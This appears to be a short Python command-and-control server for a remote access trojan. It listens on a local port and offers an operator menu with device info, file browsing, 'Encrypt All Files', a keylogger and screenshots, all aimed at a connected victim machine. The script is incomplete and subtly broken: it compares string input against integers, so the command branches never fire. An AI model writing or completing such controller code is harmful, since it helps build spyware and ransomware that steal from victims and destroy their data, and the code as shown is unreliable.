import socket
connected = True

def Connections():
    HOST = '127.0.0.1'
    PORT = 6654
    global sock , client
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST,PORT))
    sock.listen()
    print('[*] Waiting For Connection . . .\n')
    client, addr = sock.accept()
    print(f'Got Connection From {addr}\n')
    return sock , client
def menu():
    print('1. Get Device Info')
    print('2. See All Images/Videos (12. See All Files)')
    print('3. Encrypt All Files')
    print('4. Start Keylogger')
    print('5 Take Screenshot')
def handle_commands():
    file_size = b''
    while connected:
        command = input('>>> ').strip()
        if command == 1:
            client.send(command.encode())
        elif command == 2:
            client.send(command.encode())
        elif command == 3:
            client.send(command.encode())
def main():
    Connections()
    while connected:
        menu()
        handle_commands()
main()
